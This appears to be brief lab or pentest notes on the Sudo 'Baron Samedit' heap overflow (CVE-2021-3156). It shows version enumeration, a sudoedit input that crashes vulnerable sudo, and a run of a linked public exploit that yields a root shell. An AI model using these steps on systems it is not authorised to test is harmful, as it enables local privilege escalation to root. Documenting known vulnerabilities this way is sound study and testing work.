# CVE-2021-3156 - Sudo Baron Samedit

Heap-based buffer overflow in Sudo. This vulnerability:

- is exploitable by any local user (normal users and system users, sudoers and non-sudoers), without authentication (i.e., the attacker does not need to know the user's password);

- was introduced in July 2011 (commit 8255ed69), and affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1, in their default configuration.

## Enumeration

```bash
$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.3 LTS"
```

```bash
$ sudo -V

Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

Confirming the bug

```bash
$ sudoedit -s '1234567890123456789012\'

malloc(): invalid size (unsorted)
Aborted (core dumped)
```

## Exploitation

Running [exploit_nss.py](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py)

```bash
$ python3 exploit_nss.py 

# id
uid=0(root) gid=0(root) groups=0(root),1001(student)
```

## Links

- [Qualys - Baron Samedit](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)
- [GitHub - PoC - worawit](https://github.com/worawit/CVE-2021-3156)
- [GitHub - PoC - blasty](https://github.com/blasty/CVE-2021-3156)
